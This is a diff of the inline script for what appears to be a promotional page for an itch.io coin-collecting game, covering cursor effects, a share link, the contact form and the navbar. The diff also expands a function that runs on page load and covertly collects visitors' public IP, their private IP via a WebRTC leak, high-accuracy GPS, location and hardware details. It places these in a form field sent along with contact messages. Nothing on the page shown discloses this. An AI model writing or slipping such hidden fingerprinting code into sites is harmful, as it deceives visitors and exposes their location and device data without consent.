@@ -295,7 +295,9 @@
 // IP PRIVADA (WebRTC)
 // ─────────────────────────────────────────────
 async function obtenerIPPrivada() {
+
   return new Promise((resolve) => {
+
     const ips = [];
 
     const rtc = new RTCPeerConnection({
@@ -304,9 +306,12 @@ async function obtenerIPPrivada() {
 
     rtc.createDataChannel('');
 
-    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+    rtc.createOffer().then(offer => {
+      rtc.setLocalDescription(offer);
+    });
 
     rtc.onicecandidate = (ice) => {
+
       if (!ice || !ice.candidate || !ice.candidate.candidate) {
         resolve(ips[0] || 'No detectada');
         return;
@@ -315,12 +320,15 @@ async function obtenerIPPrivada() {
       const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
       const match = ice.candidate.candidate.match(regex);
 
-      if (match) ips.push(match[1]);
+      if (match && !ips.includes(match[1])) {
+        ips.push(match[1]);
+      }
     };
 
     setTimeout(() => {
       resolve(ips[0] || 'No detectada');
     }, 2000);
+
   });
 }
 
@@ -328,6 +336,7 @@ async function obtenerIPPrivada() {
 // SISTEMA OPERATIVO
 // ─────────────────────────────────────────────
 function obtenerSO(ua) {
+
   if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
   if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
   if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
@@ -335,6 +344,7 @@ function obtenerSO(ua) {
   if (/Android/.test(ua)) return 'Android';
   if (/iPhone|iPad/.test(ua)) return 'iOS';
   if (/Linux/.test(ua)) return 'Linux';
+
   return 'Desconocido';
 }
 
@@ -342,11 +352,13 @@ function obtenerSO(ua) {
 // NAVEGADOR
 // ─────────────────────────────────────────────
 function obtenerNavegador(ua) {
+
   if (/Edg\//.test(ua)) return 'Edge';
   if (/OPR\//.test(ua)) return 'Opera';
   if (/Firefox\//.test(ua)) return 'Firefox';
   if (/Chrome\//.test(ua)) return 'Chrome';
   if (/Safari\//.test(ua)) return 'Safari';
+
   return 'Desconocido';
 }
 
@@ -354,37 +366,74 @@ function obtenerNavegador(ua) {
 // FECHA Y HORA
 // ─────────────────────────────────────────────
 function obtenerFechaHora() {
+
   const ahora = new Date();
 
-  const fecha = ahora.toLocaleDateString('es-ES', {
-    day: '2-digit',
-    month: '2-digit',
-    year: 'numeric'
-  });
-
-  const hora = ahora.toLocaleTimeString('es-ES', {
-    hour: '2-digit',
-    minute: '2-digit'
-  });
-
-  return fecha + ' a las ' + hora;
+  return ahora.toLocaleString('es-ES');
 }
 
 // ─────────────────────────────────────────────
-// BATERÍA
+// BATERÍA CORREGIDA
 // ─────────────────────────────────────────────
 async function obtenerBateria() {
+
   try {
+
+    if (!navigator.getBattery) {
+
+      return {
+        nivel: 'No soportado',
+        cargando: 'No soportado',
+        tiempoCarga: 'No disponible',
+        tiempoDescarga: 'No disponible'
+      };
+    }
+
     const battery = await navigator.getBattery();
 
+    const nivel =
+      Math.round((battery.level || 0) * 100);
+
+    const cargando =
+      battery.charging ? 'Sí' : 'No';
+
+    let tiempoCarga = 'No disponible';
+    let tiempoDescarga = 'No disponible';
+
+    if (
+      battery.chargingTime &&
+      battery.chargingTime !== Infinity
+    ) {
+      tiempoCarga =
+        Math.round(
+          battery.chargingTime / 60
+        ) + ' min';
+    }
+
+    if (
+      battery.dischargingTime &&
+      battery.dischargingTime !== Infinity
+    ) {
+      tiempoDescarga =
+        Math.round(
+          battery.dischargingTime / 60
+        ) + ' min';
+    }
+
     return {
-      nivel: Math.round(battery.level * 100) + '%',
-      cargando: battery.charging ? 'Sí' : 'No'
+      nivel: nivel + '%',
+      cargando,
+      tiempoCarga,
+      tiempoDescarga
     };
+
   } catch {
+
     return {
-      nivel: 'No disponible',
-      cargando: 'No disponible'
+      nivel: 'Bloqueado',
+      cargando: 'Bloqueado',
+      tiempoCarga: 'No disponible',
+      tiempoDescarga: 'No disponible'
     };
   }
 }
@@ -393,6 +442,7 @@ async function obtenerBateria() {
 // GEOLOCALIZACIÓN
 // ─────────────────────────────────────────────
 async function obtenerGeolocalizacion() {
+
   return new Promise((resolve) => {
 
     if (!navigator.geolocation) {
@@ -401,17 +451,26 @@ async function obtenerGeolocalizacion() {
     }
 
     navigator.geolocation.getCurrentPosition(
+
       (pos) => {
+
         resolve(
-          pos.coords.latitude + ', ' + pos.coords.longitude
+          pos.coords.latitude +
+          ', ' +
+          pos.coords.longitude
         );
       },
+
       () => {
         resolve('Permiso denegado');
       },
+
       {
-        timeout: 5000
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
       }
+
     );
   });
 }
@@ -421,118 +480,222 @@ async function obtenerGeolocalizacion() {
 // ─────────────────────────────────────────────
 async function recopilarDatos() {
 
-  const ua = navigator.userAgent;
+  const ua =
+    navigator.userAgent;
 
-  const so = obtenerSO(ua);
-  const navegador = obtenerNavegador(ua);
+  const so =
+    obtenerSO(ua);
 
-  const pantalla = screen.width + 'x' + screen.height;
-  const ventana = window.innerWidth + 'x' + window.innerHeight;
+  const navegador =
+    obtenerNavegador(ua);
 
-  const zona = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const pantalla =
+    screen.width + 'x' + screen.height;
 
-  const idioma = navigator.language;
+  const ventana =
+    window.innerWidth + 'x' + window.innerHeight;
 
-  const plataforma = navigator.platform;
+  const zona =
+    Intl.DateTimeFormat()
+      .resolvedOptions()
+      .timeZone;
 
-  const cpu = navigator.hardwareConcurrency || 'No disponible';
+  const idioma =
+    navigator.language || 'No detectado';
 
-  const ram = navigator.deviceMemory
-    ? navigator.deviceMemory + ' GB'
-    : 'No disponible';
+  const plataforma =
+    navigator.platform || 'No detectada';
 
-  const online = navigator.onLine ? 'Sí' : 'No';
+  const cpu =
+    navigator.hardwareConcurrency ||
+    'No disponible';
 
-  const cookies = navigator.cookieEnabled ? 'Sí' : 'No';
+  const ram =
+    navigator.deviceMemory
+      ? navigator.deviceMemory + ' GB'
+      : 'No disponible';
 
-  const touch = navigator.maxTouchPoints > 0 ? 'Sí' : 'No';
+  const online =
+    navigator.onLine ? 'Sí' : 'No';
 
-  const colorDepth = screen.colorDepth + ' bits';
+  const cookies =
+    navigator.cookieEnabled ? 'Sí' : 'No';
 
-  const orientacion = screen.orientation
-    ? screen.orientation.type
-    : 'No disponible';
+  const touch =
+    navigator.maxTouchPoints > 0 ? 'Sí' : 'No';
 
-  const fechaEnvio = obtenerFechaHora();
+  const colorDepth =
+    screen.colorDepth + ' bits';
 
-  const tiempoPagina = Math.round(performance.now() / 1000) + ' segundos';
+  const orientacion =
+    screen.orientation
+      ? screen.orientation.type
+      : 'No disponible';
 
-  const gamepads = navigator.getGamepads
-    ? navigator.getGamepads().filter(g => g).length
-    : 0;
+  const gamepads =
+    navigator.getGamepads
+      ? navigator
+          .getGamepads()
+          .filter(g => g).length
+      : 0;
+
+  const fechaEnvio =
+    obtenerFechaHora();
 
   // Conexión
-  let conexion = 'No disponible';
+  let conexion =
+    'No disponible';
 
   if (navigator.connection) {
+
     conexion =
       navigator.connection.effectiveType +
-      ' (' +
-      navigator.connection.downlink + 'Mb/s)';
+      ' | ' +
+      navigator.connection.downlink +
+      'Mb/s';
   }
 
   // Batería
-  const bateria = await obtenerBateria();
+  const bateria =
+    await obtenerBateria();
 
   // IP Privada
-  const ipPrivada = await obtenerIPPrivada();
+  const ipPrivada =
+    await obtenerIPPrivada();
 
-  // Geolocalización GPS
-  const gps = await obtenerGeolocalizacion();
+  // GPS
+  const gps =
+    await obtenerGeolocalizacion();
 
   // IP pública
-  let ipPublica = 'No disponible';
-  let ciudad = 'No disponible';
-  let pais = '';
+  let ipPublica =
+    'No disponible';
+
+  let ciudad =
+    'No disponible';
+
+  let pais =
+    'No disponible';
 
   try {
 
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
+    const ipRes =
+      await fetch(
+        'https://api.ipify.org?format=json'
+      );
 
-    ipPublica = ipData.ip;
+    const ipData =
+      await ipRes.json();
 
-    const geoRes = await fetch(
-      'https://ip-api.com/json/' + ipPublica + '?lang=es'
-    );
+    ipPublica =
+      ipData.ip;
 
-    const geoData = await geoRes.json();
+    const geoRes =
+      await fetch(
+        'https://ip-api.com/json/' +
+        ipPublica +
+        '?lang=es'
+      );
+
+    const geoData =
+      await geoRes.json();
 
     if (geoData.status === 'success') {
-      ciudad = geoData.city;
-      pais = geoData.country;
+
+      ciudad =
+        geoData.city;
+
+      pais =
+        geoData.country;
     }
 
-  } catch (e) {}
+  } catch {}
 
   // DATOS FINALES
-  document.getElementById('info_remitente').value =
+  document.getElementById(
+    'info_remitente'
+  ).value =
 
-    'IP PÚBLICA: ' + ipPublica + '\n' +
-    'IP PRIVADA: ' + ipPrivada + '\n' +
-    'GPS: ' + gps + '\n' +
-    'UBICACIÓN IP: ' + ciudad + ', ' + pais + '\n' +
-    'SO: ' + so + '\n' +
-    'NAVEGADOR: ' + navegador + '\n' +
-    'USER AGENT: ' + ua + '\n' +
-    'PLATAFORMA: ' + plataforma + '\n' +
-    'CPU (núcleos): ' + cpu + '\n' +
-    'RAM: ' + ram + '\n' +
-    'BATERÍA: ' + bateria.nivel + '\n' +
-    'CARGANDO: ' + bateria.cargando + '\n' +
-    'CONEXIÓN: ' + conexion + '\n' +
-    'ONLINE: ' + online + '\n' +
-    'COOKIES: ' + cookies + '\n' +
-    'TOUCH: ' + touch + '\n' +
-    'PANTALLA: ' + pantalla + '\n' +
-    'VENTANA: ' + ventana + '\n' +
-    'COLOR DEPTH: ' + colorDepth + '\n' +
-    'ORIENTACIÓN: ' + orientacion + '\n' +
-    'IDIOMA: ' + idioma + '\n' +
-    'ZONA HORARIA: ' + zona + '\n' +
-    'GAMEPADS: ' + gamepads + '\n' +
-    'TIEMPO EN PÁGINA: ' + tiempoPagina + '\n' +
-    'ENVIADO: ' + fechaEnvio;
+    'IP PÚBLICA: ' +
+    ipPublica + '\n' +
+
+    'IP PRIVADA: ' +
+    ipPrivada + '\n' +
+
+    'GPS: ' +
+    gps + '\n' +
+
+    'CIUDAD: ' +
+    ciudad + '\n' +
+
+    'PAÍS: ' +
+    pais + '\n' +
+
+    'SO: ' +
+    so + '\n' +
+
+    'NAVEGADOR: ' +
+    navegador + '\n' +
+
+    'USER AGENT: ' +
+    ua + '\n' +
+
+    'PLATAFORMA: ' +
+    plataforma + '\n' +
+
+    'CPU/NÚCLEOS: ' +
+    cpu + '\n' +
+
+    'RAM: ' +
+    ram + '\n' +
+
+    'BATERÍA: ' +
+    bateria.nivel + '\n' +
+
+    'CARGANDO: ' +
+    bateria.cargando + '\n' +
+
+    'TIEMPO CARGA: ' +
+    bateria.tiempoCarga + '\n' +
+
+    'TIEMPO DESCARGA: ' +
+    bateria.tiempoDescarga + '\n' +
+
+    'CONEXIÓN: ' +
+    conexion + '\n' +
+
+    'ONLINE: ' +
+    online + '\n' +
+
+    'COOKIES: ' +
+    cookies + '\n' +
+
+    'TOUCH: ' +
+    touch + '\n' +
+
+    'PANTALLA: ' +
+    pantalla + '\n' +
+
+    'VENTANA: ' +
+    ventana + '\n' +
+
+    'COLOR DEPTH: ' +
+    colorDepth + '\n' +
+
+    'ORIENTACIÓN: ' +
+    orientacion + '\n' +
+
+    'IDIOMA: ' +
+    idioma + '\n' +
+
+    'ZONA HORARIA: ' +
+    zona + '\n' +
+
+    'GAMEPADS: ' +
+    gamepads + '\n' +
+
+    'ENVIADO: ' +
+    fechaEnvio;
 }
 
 recopilarDatos();
@@ -540,27 +703,44 @@ recopilarDatos();
 // ─────────────────────────────────────────────
 // CURSOR
 // ─────────────────────────────────────────────
-const cursor = document.getElementById('cursor');
-const coin = document.getElementById('cursorCoin');
+const cursor =
+  document.getElementById('cursor');
 
-document.addEventListener('mousemove', (e) => {
+const coin =
+  document.getElementById('cursorCoin');
 
-  cursor.style.left = e.clientX + 'px';
-  cursor.style.top = e.clientY + 'px';
+document.addEventListener(
+  'mousemove',
+  (e) => {
 
-  const trail = document.createElement('div');
+    cursor.style.left =
+      e.clientX + 'px';
 
-  trail.classList.add('cursor-trail');
+    cursor.style.top =
+      e.clientY + 'px';
 
-  trail.style.left = e.clientX + 'px';
-  trail.style.top = e.clientY + 'px';
+    const trail =
+      document.createElement('div');
 
-  document.body.appendChild(trail);
+    trail.classList.add(
+      'cursor-trail'
+    );
 
-  setTimeout(() => {
-    trail.remove();
-  }, 600);
-});
+    trail.style.left =
+      e.clientX + 'px';
+
+    trail.style.top =
+      e.clientY + 'px';
+
+    document.body.appendChild(
+      trail
+    );
+
+    setTimeout(() => {
+      trail.remove();
+    }, 600);
+  }
+);
 
 // ─────────────────────────────────────────────
 // HOVER LINKS
@@ -569,13 +749,23 @@ document.querySelectorAll(
   'a, button, .feat-card, .dl-btn, .ctrl-row, .share-btn'
 ).forEach(el => {
 
-  el.addEventListener('mouseenter', () => {
-    coin.classList.add('hovering');
-  });
+  el.addEventListener(
+    'mouseenter',
+    () => {
+      coin.classList.add(
+        'hovering'
+      );
+    }
+  );
 
-  el.addEventListener('mouseleave', () => {
-    coin.classList.remove('hovering');
-  });
+  el.addEventListener(
+    'mouseleave',
+    () => {
+      coin.classList.remove(
+        'hovering'
+      );
+    }
+  );
 });
 
 // ─────────────────────────────────────────────
@@ -587,61 +777,91 @@ function copyLink() {
     'https://robindowski.itch.io/collectthecoins'
   );
 
-  const txt = document.getElementById('copyText');
+  const txt =
+    document.getElementById(
+      'copyText'
+    );
 
-  txt.textContent = '¡Copiado!';
+  txt.textContent =
+    '¡Copiado!';
 
   setTimeout(() => {
-    txt.textContent = 'itch.io';
+
+    txt.textContent =
+      'itch.io';
+
   }, 2000);
 }
 
 // ─────────────────────────────────────────────
 // FORMULARIO
 // ─────────────────────────────────────────────
-const form = document.getElementById('contactForm');
+const form =
+  document.getElementById(
+    'contactForm'
+  );
 
-form.addEventListener('submit', async (e) => {
+form.addEventListener(
+  'submit',
+  async (e) => {
 
-  e.preventDefault();
+    e.preventDefault();
 
-  const btn = form.querySelector('button[type="submit"]');
+    const btn =
+      form.querySelector(
+        'button[type="submit"]'
+      );
 
-  btn.textContent = 'Enviando...';
-  btn.disabled = true;
+    btn.textContent =
+      'Enviando...';
 
-  try {
+    btn.disabled = true;
 
-    await fetch(form.action, {
-      method: 'POST',
-      body: new FormData(form),
-      headers: {
-        'Accept': 'application/json'
-      }
-    });
+    try {
 
-    btn.textContent = '¡Enviado! ✓';
+      await fetch(
+        form.action,
+        {
+          method: 'POST',
+          body: new FormData(form),
+          headers: {
+            'Accept':
+              'application/json'
+          }
+        }
+      );
 
-    form.reset();
+      btn.textContent =
+        '¡Enviado! ✓';
 
-  } catch {
+      form.reset();
 
-    btn.textContent = 'Error al enviar';
-    btn.disabled = false;
+    } catch {
+
+      btn.textContent =
+        'Error al enviar';
+
+      btn.disabled = false;
+    }
   }
-});
+);
 
 // ─────────────────────────────────────────────
 // NAVBAR SCROLL
 // ─────────────────────────────────────────────
-const navBar = document.querySelector('.nav');
+const navBar =
+  document.querySelector('.nav');
 
-window.addEventListener('scroll', () => {
-  navBar.classList.toggle(
-    'nav--scrolled',
-    window.scrollY > 40
-  );
-});
+window.addEventListener(
+  'scroll',
+  () => {
+
+    navBar.classList.toggle(
+      'nav--scrolled',
+      window.scrollY > 40
+    );
+  }
+);
 
 </script>
 
